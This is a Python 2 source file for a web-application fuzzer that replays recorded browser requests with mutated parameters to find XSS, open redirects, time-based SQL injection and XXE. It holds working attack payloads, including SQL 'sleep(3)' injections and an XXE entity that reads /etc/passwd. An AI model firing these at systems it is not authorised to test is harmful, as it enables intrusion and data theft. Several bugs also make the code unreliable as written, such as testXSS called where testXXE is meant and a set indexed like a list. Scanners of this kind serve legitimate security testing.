import requests
import copy
from urlparse import *
from hints import *
from time import sleep
import re

# This class fuzzes web applications by mutating parameters of genuine requests
# The goal is to have an extensive mechanism to thoroughly test for standard vulnerabilities
#
class Fuzz:
    requestWaitTime=0.1 # seconds   -   used to prevent overloading of servers
    keepHeaders={'Upgrade-Insecure-Requests', 'User-Agent', 'Accept', 'Accept-Encoding', 'Accept-Language'}
    headers={}  # all the resulting filtered headers per each request
    requests=[] # all the requests
    necessaryRequests={} # map requestId -> boolean to memorize if it's a required requets
    lenNecessaryRequests=None
    GET_params={}
    GET_hints={}    # contains the hints that the fuzzer got to test attacks on specific GET_params
    POST_params={}
    POST_hints={}
    COOKIE_hints={}
    HEADER_hints={}
    reached_id=0    # the fuzzer passes through all the requests and keep the reached_id as reference

    XSS_inj='<js>'
    SQL_inj={'1\'; sleep(3)--', '1; sleep(3)--', '1\'); sleep(3)--', '1); sleep(3)--'}
    craftUrl='http://www.ciao.com'

    # if a url points to a path in which the file has one of these extensions, then the request will be ignored
    # probably this mechanism is not good enough, especially if the backend has custom configuration
    # but still it should be useful to skip unnecessary requests (that don't trigger bugs)
    ignored_extensions={'jpg', 'jpeg', 'mp3', 'mp4', 'png', 'tiff', 'bmp', 'wav', 'ogg'}

    def get_XSS_payload(self, paramName, paramValue):
        # paramValue can be a list
        return str(paramValue)+" "+Fuzz.XSS_inj+str(self.reached_id)+paramName+Fuzz.XSS_inj

    def get_SQL_payload(self, index):
        if index<0 or index>=len(Fuzz.SQL_inj):
            raise ValueError('index not in range of SQL_inj')
        return SQL_inj[index]

    #return whether an url of a request is required to be tested for injections
    @staticmethod
    def to_test(url):
        o = urlparse(url)
        i = len(o.path)-1
        while i>=0:
            if o.path[i]=='.':
                return o.path[i+1:] not in Fuzz.ignored_extensions if i+1<len(o.path) else True
            elif o.path[i]=='/':
                return True
            i-=1
        return True

    # from https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing
    def get_XXE_payload(self):
        return '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>'

    def put_headers(self, s, requestId):
        s.headers.update(self.headers[requestId])
        #print self.headers[requestId]

    def send_req(self, requestId, s, url, method, post=None):
        if requestId not in self.necessaryRequests or self.necessaryRequests[requestId]==False:
            return
        sleep(Fuzz.requestWaitTime)
        self.put_headers(s,requestId)
        if method=='GET':
            return s.get(url,verify=False)
        elif method=='POST':
            return s.post(url, params=post, verify=False)
        return None

    def __init__(self, reqs, headers, xss, sqli, xee):
        self.requests= copy.deepcopy(reqs)

        # get params
        for request in self.requests:
            # test from url if the request is a necessary one (e.g. not static content with no or trivial backend interaction)
            self.necessaryRequests[request['requestId']]=Fuzz.to_test(request['url'])
            #print request['url']+" "+str(self.necessaryRequests[request['requestId']])
            self.GET_params[request['requestId']]=parse_qs(urlparse(request['url']).query)
            if request['method']=='POST':
                self.POST_params[request['requestId']]=request['requestBody']

        # update how many requests are necessary to be sent in a whole trace
        lenNecessaryRequests=sum(self.necessaryRequests.values())

        # filter headers
        self.headers={}
        for header in headers:
            self.headers[header['requestId']]={}
            for requestHeaders in header['requestHeaders']:
                if requestHeaders['name'] in Fuzz.keepHeaders:
                    self.headers[header['requestId']][requestHeaders['name']]=requestHeaders['value']
        # copy testing flags
        self.xss=xss
        self.sqli=sqli
        self.xee=xee

    def estimate_effort(self):
        total=0
        for request in self.requests:
            #params=len(self.GET_params[request['requestId']])
            #if request['method']=="POST":
                #params+=len(self.POST_params[request['requestId']])
            #total+=(params*counter)

            if self.xss:
                for hint in self.GET_hints[request['requestId']]:
                    val = self.GET_hints[request['requestId']][hint]
                    if (not val&Hints.NOT_FOUND) and (not val&Hints.FOUND_ESCAPED):
                        if val&Hints.URL:
                            total+=len(self.requests) #count open redirect
                        total+=len(self.requests)
            if self.sqli:    # each XEE test take as many requests as the trace multiplied by the SQL payloads
                for param in self.GET_params:
                    total+=len(Fuzz.SQL_inj)*lenNecessaryRequests
                for param in self.POST_params:
                    total+=len(Fuzz.SQL_inj)*lenNecessaryRequests
            if self.xee:    # each XEE test take as many requests as the trace
                for param in self.GET_params:
                    if hint&Hints.XML:
                        total+=lenNecessaryRequests
                for param in self.POST_params:
                    if hint&Hints.XML:
                        total+=lenNecessaryRequests
        total+=len(self.requests) #count also the requests needed to probe
        print "Exactly "+str(total)+" requests needed to fuzz.."

    def fuzz(self):
        self.probe()    #probe normally to get hints on possible injections
        self.estimate_effort()

        for request in self.requests:
            self.reached_id=int(request['requestId'])
            print request['url']+' '+request['method']
            if request['method']=='GET':
                for param in self.GET_params[request['requestId']]:
                    if self.xss:
                        self.testXSS('GET',request['url'],request['requestId'],param)
                    if self.sqli:
                        self.testSQL('GET',request['url'],request['requestId'],param)
                    if self.xee:
                        self.testXSS('GET',request['url'],request['requestId'],param)

                #print self.send_req(requests[i]['requestId'], s, requests[i]['url'], 'GET').text.encode('utf-8')
            elif request['method']=='POST':
                if 'formData' in request['requestBody']:
                    for param in request['requestBody']['formData']:
                        if self.xss:
                            self.testXSS('POST',request['url'],request['requestId'],param,request['requestBody'])
                        if self.sqli:
                            self.testSQL('POST',request['url'],request['requestId'],param,request['requestBody'])
                        if self.xee:
                            self.testXSS('POST',request['url'],request['requestId'],param,request['requestBody'])

                        #print self.send_req(requests[i]['requestId'], s, requests[i]['url'], 'POST' , post=requests[i]['requestBody']).text.encode('utf-8')

    @staticmethod
    def substParam(url,name,newValue):
        index=url.index(name+'=')
        if index!=-1:
            index+=len(name)+1
            try:
                index2=url[index:].index('&')
                if index2!=-1:
                    return url[0:index]+newValue+url[index+index2:]
            except:
                return url[0:index]+newValue

    @staticmethod
    def parseGETVal(url, param):
        try:
            val=""
            index=url.index(param)+len(param)+1
            while index<(len(url)):
                if url[index]=='&':
                    break
                val+=url[index]
                index+=1
            return val
        except:
            raise ValueError('Param not in URL')

    def probe(self):
        print "probing.."
        s = requests.Session()
        for request in self.requests:
            self.GET_hints[request['requestId']]={}
            self.POST_hints[request['requestId']]={}
            self.COOKIE_hints[request['requestId']]={}
            self.HEADER_hints[request['requestId']]={}
        for request in self.requests:
            prec_cookies = copy.deepcopy(s.cookies) # save cookies to check if they appear in the page
            # probe GET/POST parameters
            if request['method']=='GET':
                response=self.send_req(request['requestId'], s, request['url'], 'GET').text.encode('utf-8')
                for param in self.GET_params[request['requestId']]:
                    self.GET_hints[request['requestId']][param]=parseFuzz(response,Fuzz.parseGETVal(request['url'],param))
            elif request['method']=='POST':
                response=self.send_req(request['requestId'], s, request['url'], 'POST').text.encode('utf-8')
                for param in self.GET_params[request['requestId']]:
                    self.GET_hints[request['requestId']][param]=parseFuzz(response,Fuzz.parseGETVal(request['url'],param))
                if 'formData' in request['requestBody']:
                    for param in self.POST_params[request['requestId']]['formData']:
                        self.POST_hints[request['requestId']][param]=parseFuzz(response,request['requestBody']['formData'][param])
            else:
                raise ValueError('request method '+request['method']+" yet unsupported")
            # probe cookies
            for c in prec_cookies:
                self.COOKIE_hints[request['requestId']][c.name]=parseFuzz(response, c.value)
            #probe headers
            for h in s.headers:
                if h not in Fuzz.keepHeaders:
                    self.HEADER_hints[request['requestId']][h]=parseFuzz(response,s.headers[h])

            for hint in self.GET_hints[request['requestId']]:
                if not (self.GET_hints[request['requestId']][hint]&1):
                    print 'got hint '+hint

    # sends genuine requests till the request we are fuzzing (to have the original "session-state")
    def catchUp(self, s):
        #print "len: "+str(len(self.requests))
        for request in self.requests:
            if int(request['requestId'])<self.reached_id:
                if request['method']=='GET':
                    response = self.send_req(request['requestId'], s,request['url'], 'GET').text.encode('utf-8')
                elif request['method']=='POST':
                    response = self.send_req(request['requestId'], s,request['url'], 'POST', post = request['requestBody']).text.encode('utf-8')
                Fuzz.verifyXSS(response)
            else:
                break

    def tillTheEnd(self, s):
        i=0
        while int(self.requests[i]['requestId'])<=self.reached_id:
            i+=1
        while i<len(self.requests):
            request=self.requests[i]
            if request['method']=='GET':
                response= self.send_req(request['requestId'], s, request['url'],'GET').text.encode('utf-8')
            elif requests[i]['method']=='POST':
                response= self.send_req(request['requestId'], s, request['url'], 'POST', post = request['requestBody']).text.encode('utf-8')
            Fuzz.verifyXSS(response)
            i+=1

    @staticmethod
    def verifyXSS(response_text):
        if Fuzz.XSS_inj in response_text:
            print "Fuzz found !!"
            index=response_text.index(Fuzz.XSS_inj)+len(Fuzz.XSS_inj)
            print response_text[index:index+response_text[index:].index(Fuzz.XSS_inj)] #print the payload info of the XSS
            return True
        return False

    @staticmethod
    def verifyRedirect(response):
        if len(response.history)>0:
            if Fuzz.craftUrl in response.url:
                print "FOUND OPEN REDIRECT"
                exit()

    def testOpenRedirect(self, url, param, method, requestId, post_=None):
        #test for Open-redirect
        s=requests.Session()
        self.catchUp(s)
        newUrl = Fuzz.substParam(url,param,Fuzz.craftUrl)
        response = self.send_req(requestId, s, newUrl, method)
        Fuzz.verifyRedirect(response)
        self.tillTheEnd(s) #follow the remaining requests to check for the redirect

    def testXSS(self, method, url, requestId, param, postData=None):
        s = requests.Session()
        if method=='GET':
            # if the param result in the text unescaped try to inject
            hint = self.GET_hints[requestId][param]
            #print param+" "+str(hint)
            if hint&Hints.NOT_FOUND:
                return
            elif not (hint&Hints.FOUND_ESCAPED):
                if hint&Hints.JS:
                    print "JS  found "+param+" "+url
                    exit()
                if hint&Hints.URL:
                    print "FOUND URL"
                    self.testOpenRedirect(url, param, 'GET', requestId)
                else:
                    newUrl = Fuzz.substParam(url,param,self.get_XSS_payload(param, self.GET_params[requestId][param]))
            else:
                return

            self.catchUp(s)
            response = self.send_req(requestId, s, newUrl, 'GET').text.encode('utf-8')
            Fuzz.verifyXSS(response)
            self.tillTheEnd(s)

            print "##################"
            print newUrl
            print "##################"
            print param
        elif method=='POST':
            newPost=copy.deepcopy(postData)
            newPost['formData'][param]=self.get_XSS_payload(param, postData['formData'][param])
            self.catchUp(s)
            response = self.send_req(requestId, s, url, 'POST', post=newPost).text.encode('utf-8')
            Fuzz.verifyXSS(response)
            self.tillTheEnd(s)

            print "##################"
            print newPost
            print "##################"

    def verifySQL(self, response, param, requestId):
        if response.status_code>=500:
            print "Potential SQLI in "+param+" id:"+requestId
            return True
        elif response.elapsed.total_seconds()>=3:
            print "Successful SQLI in "+param+" id:"+requestId
            return True
        else:
            try:
                pass
                #should test for SQL error messages in response
                #if re.search('SQL|error', response.text)!=None:
                #    print "SQL error shown in page"
            except:
                pass
            return False

    # for each test, try each injection string and verify
    def testSQL(self, method, url, requestId, param, postData=None):
        s=requests.Session()
        if method=='GET':
            for i in range(len(Fuzz.SQL_inj)):
                newUrl = Fuzz.substParam(url,param,self.get_SQL_payload(i))
                self.catchUp(s)
                print "Attempting GET SQLI on "+param
                response = self.send_req(requestId, s, newUrl, 'GET')
                if self.verifySQL(response, param, requestId):
                    break
                self.tillTheEnd(s)
        elif method=='POST':
            for i in range(len(Fuzz.SQL_inj)):
                newPost=copy.deepcopy(postData)
                newPost['formData'][param]=self.get_SQL_payload(i)
                self.catchUp(s)
                print "Attempting GET SQLI on "+param
                response = self.send_req(requestId, s, url, 'POST', post=newPost)
                if self.verifySQL(response, param, requestId):
                    break
                self.tillTheEnd(s)

    def verifyXXE(self, response, param, requestId):
        try:
            if response.status_code>=500:
                print "Potential XXE in "+requestId+" "+param
            else:
                response.text.index('root:x:0:0:root')
                print "XXE found in "+requestId+" "+param
                return True
        except:
            return False

    def testXXE(self, method, url, requestId, param, postData=None):
        s=requests.Session()
        if method=='GET':
            newUrl = Fuzz.substParam(url,param,self.get_XXE_payload())
            self.catchUp(s)
            response = self.send_req(requestId, s, newUrl, 'GET')
            print "Attempting GET XXE on "+param
            self.verifyXXE(response, param, requestId)
        elif method=='POST':
            newPost=copy.deepcopy(postData)
            newPost['formData'][param]=self.get_XXE_payload()
            self.catchUp(s)
            response = self.send_req(requestId, s, url, 'POST', post=newPost)
            print "Attempting GET XXE on "+param
            self.verifyXXE(response, param, requestId)
